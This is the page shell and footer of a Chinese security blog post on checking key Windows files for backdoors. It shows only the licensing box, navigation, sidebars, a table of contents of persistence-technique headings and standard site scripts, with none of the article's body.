+</div><div class="article-licensing box"><div class="licensing-title"><p>Windows 关键文件安全性排查(红蓝对抗)</p><p><a href="https://resek4.github.io/2021/05/12/Windows后门及排查/">https://resek4.github.io/2021/05/12/Windows后门及排查/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Resek4</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2021-05-12</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2023-01-27</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-604b3726d8c18ac5" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/06/11/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">简易内网信息收集</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/05/11/Linux%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"><span class="level-item">Linux 关键文件安全性排查(红蓝对抗)</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><script src="https://utteranc.es/client.js" repo="Resek4/resek4.github.io" issue-term="pathname" theme="dark-blue" crossorigin="anonymous" async></script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="Resek4"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Resek4</p><p class="is-size-6 is-block">对黑客创意上下求索</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>NightCity</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">29</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Resek4" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Resek4"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/Resek_4"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="https://resek4.github.io"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/01/"><span class="level-start"><span class="level-item">January 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/08/"><span class="level-start"><span class="level-item">August 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">July 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">June 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">May 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">March 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">January 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">November 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/09/"><span class="level-start"><span class="level-item">September 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/12/"><span class="level-start"><span class="level-item">December 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">November 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#参考文章"><span class="level-left"><span class="level-item">1</span><span class="level-item">参考文章</span></span></a></li><li><a class="level is-mobile" href="#系统工具替换后门"><span class="level-left"><span class="level-item">2</span><span class="level-item">系统工具替换后门</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#utilman-辅助工具管理器"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">[[utilman]]辅助工具管理器</span></span></a></li><li><a class="level is-mobile" href="#sethc-exe-轻松使用"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">sethc.exe 轻松使用</span></span></a></li></ul></li><li><a class="level is-mobile" href="#后门账号"><span class="level-left"><span class="level-item">3</span><span class="level-item">后门账号</span></span></a></li><li><a class="level is-mobile" href="#明文账号记录"><span class="level-left"><span class="level-item">4</span><span class="level-item">明文账号记录</span></span></a></li><li><a class="level is-mobile" href="#文件隐藏"><span class="level-left"><span class="level-item">5</span><span class="level-item">文件隐藏</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#attrib-命令隐藏"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">attrib 命令隐藏</span></span></a></li><li><a class="level is-mobile" href="#使用-ADS-流隐藏-webshell"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">使用 ADS 流隐藏 webshell</span></span></a></li></ul></li><li><a class="level is-mobile" href="#计划任务"><span class="level-left"><span class="level-item">6</span><span class="level-item">计划任务</span></span></a></li><li><a class="level is-mobile" href="#开机启动项"><span class="level-left"><span class="level-item">7</span><span class="level-item">开机启动项</span></span></a></li><li><a class="level is-mobile" href="#服务"><span class="level-left"><span class="level-item">8</span><span class="level-item">服务</span></span></a></li><li><a class="level is-mobile" href="#waitfor-exe"><span class="level-left"><span class="level-item">9</span><span class="level-item">waitfor.exe</span></span></a></li><li><a class="level is-mobile" href="#bitsadmin-后门"><span class="level-left"><span class="level-item">10</span><span class="level-item">bitsadmin 后门</span></span></a></li><li><a class="level is-mobile" href="#WMI-后门-重点"><span class="level-left"><span class="level-item">11</span><span class="level-item">WMI 后门(重点!)</span></span></a></li><li><a class="level is-mobile" href="#COM-劫持"><span class="level-left"><span class="level-item">12</span><span class="level-item">COM 劫持</span></span></a></li><li><a class="level is-mobile" href="#meterpreter-权限维持"><span class="level-left"><span class="level-item">13</span><span class="level-item">meterpreter 权限维持</span></span></a></li><li><a class="level is-mobile" href="#Empire-persistence-模块-重点"><span class="level-left"><span class="level-item">14</span><span class="level-item">Empire persistence 模块(重点!!)</span></span></a></li><li><a class="level is-mobile" href="#进程注入-重点"><span class="level-left"><span class="level-item">15</span><span class="level-item">进程注入(重点!!)</span></span></a></li><li><a class="level is-mobile" href="#BDF-后门"><span class="level-left"><span class="level-item">16</span><span class="level-item">BDF 后门</span></span></a></li><li><a class="level is-mobile" href="#IIS-模块后门"><span class="level-left"><span class="level-item">17</span><span class="level-item">IIS 模块后门</span></span></a></li><li><a class="level is-mobile" href="#域-环境后门"><span class="level-left"><span class="level-item">18</span><span class="level-item">[[域]]环境后门</span></span></a></li><li><a class="level is-mobile" href="#other"><span class="level-left"><span class="level-item">19</span><span class="level-item">other</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/HackStyle/"><span class="level-start"><span class="level-item">HackStyle</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/categories/Penetration/"><span class="level-start"><span class="level-item">Penetration</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/TechLearning/"><span class="level-start"><span class="level-item">TechLearning</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/Toolkit/"><span class="level-start"><span class="level-item">Toolkit</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-09T16:00:00.000Z">2023-01-10</time></p><p class="title"><a href="/2023/01/10/Git/">Simple git use summary</a></p><p class="categories"><a href="/categories/TechLearning/">TechLearning</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-30T16:00:00.000Z">2022-12-31</time></p><p class="title"><a href="/2022/12/31/fzf/">fzf(Fuzzy File Finder) Usage Summary</a></p><p class="categories"><a href="/categories/Toolkit/">Toolkit</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-08T16:00:00.000Z">2022-12-09</time></p><p class="title"><a href="/2022/12/09/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BA%E5%AE%B6%E5%BA%AD%E5%BD%B1%E9%99%A2/">使用树莓派搭建 Kodi 家庭影院</a></p><p class="categories"><a href="/categories/HackStyle/">HackStyle</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-12-06T16:00:00.000Z">2022-12-07</time></p><p class="title"><a href="/2022/12/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%BB%BA%E5%9B%BE%E5%BA%8A/">使用 Raspberry Pi 自建 MinIO 图床</a></p><p class="categories"><a href="/categories/HackStyle/">HackStyle</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-25T17:52:00.000Z">2022-10-26</time></p><p class="title"><a href="/2022/10/26/Arch%20Linux%20%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B/">Arch Linux 全流程安装纪实</a></p><p class="categories"><a href="/categories/Toolkit/">Toolkit</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.jpg" alt="Resek&#039;s Kingdom" height="28"></a><p class="is-size-7"><span>&copy; 2023 Resek4</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Resek4"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "This website uses cookies to improve your experience.",
+          dismiss: "Got it!",
+          allow: "Allow cookies",
+          deny: "Decline",
+          link: "Learn more",
+          policy: "Cookie Policy",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
+        });</script></body></html>
